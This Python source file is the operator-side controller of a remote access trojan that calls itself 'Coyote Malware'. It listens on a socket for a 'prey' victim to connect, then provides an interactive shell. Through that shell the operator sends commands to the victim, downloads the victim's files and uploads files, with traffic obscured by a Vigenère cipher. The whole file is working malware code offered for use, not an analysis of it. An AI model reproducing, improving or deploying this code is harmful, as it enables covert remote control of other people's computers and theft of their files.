#-*-coding: utf-8-*-
from socket import socket, AF_INET, SOCK_STREAM
from crypt import Vigenere as v
from optparse import OptionParser as op
from threading import Thread 
from time import sleep
from os import system, path
from sys import argv

class Coyote:
    def __init__(self, ip ,port, key, defaulthearing=True, printing=True):
        if(printing):
            print("Starting Coyote Malware...");
        self.conn = 0;
        self.v = v(key);
        self.sock = socket(AF_INET, SOCK_STREAM);
        self.sock.bind((ip, port));
        self.sock.listen(1);
        self.hearing = True;
        if(defaulthearing):
            if(printing):
                print("Waiting for prey");
            self.conn, addr = self.sock.accept();
            self.conn.settimeout(0.0);
            if(printing):
                print("They prey has connected");
    def shell(self):
        print("Hearing prey.");
        ears = Thread(target=self.hear_prey);
        ears.daemon = True;
        ears.start();
        cmd = "";
        while cmd != "exit":
            cmd = input(">>>");
            if(cmd[:3] == "get"):
                self.send(cmd);
            elif(cmd[:4] == "send"):
                self.send(cmd);
                self.sendFile(cmd[5:]);
            elif cmd == "cls":
                system("cls");
            else:
                self.send(cmd);
        self.conn.close();

    def hear_prey(self):
        while(self.hearing):
            msj = self.recv(b=2048, prnt=False);
            if(msj == 0):
                continue;
            if(msj[:2] == "**"):
                self.getFile(msj[3:]);
            else:
                print("\n{}".format(msj));
                print("\n>>>");



    def send(self, msj, encrypt=True, prnt=False):
        if(encrypt):
            msj = self.v.encrypt(msj);
        if(prnt):
            print(msj);
        if(type(msj) != type(b"byte")):
            msj = str(msj).encode();
        self.conn.send(msj);
    def getFile(self, file):
        self.conn.settimeout(20);
        size = -1;
        with open(file, "wb") as f:
            try:
                size = int(self.recv(decode=True));
                print("Size of {}: {}".format(file, size));
                content = self.recv(decode=False, decrypt=True, b=size);
            except Exception as e:
                print(e);
                if(size == -1):
                    print("The program did not get the size of the file.");
                else:
                    print("The program did not get the file.");
            else:
                f.write(str(content).encode());
            finally:
                self.conn.settimeout(0.0);

    def sendFile(self, file):
        try:
            with open(file,"rb") as f:
                content = f.read(1024);
        except FileNotFoundError:
            print("File not found.");
        else:
            self.send(content, encrypt=True);
    def recv(self, prnt = True, decode = True, decrypt = True, b=1024):
        try:
            msj = self.conn.recv(b);
        except:
            return 0;
        else:
            if(decrypt):
                msj = self.v.decrypt(msj.decode()).encode();
            if(decode):
                msj = msj.decode();
            if(prnt):
                print(msj);
            return msj;



def main():
    oP = op("Usage: %prog [flags] [args]");
    oP.add_option("-H" ,"--host",dest="ip" ,default="127.0.0.1",type="str",help="Set your host");
    oP.add_option("-p","--port",dest="port",default=5000, type="int",help="Set your port");
    oP.add_option("-k", "--key",dest="key", default="eajlkwbcpqynvhigdrzotusfmx", type="str", help="Set key");
    (o, argv) = oP.parse_args();
    c = Coyote(o.ip,o.port,o.key);
    c.shell();

if __name__ == '__main__':
    main()

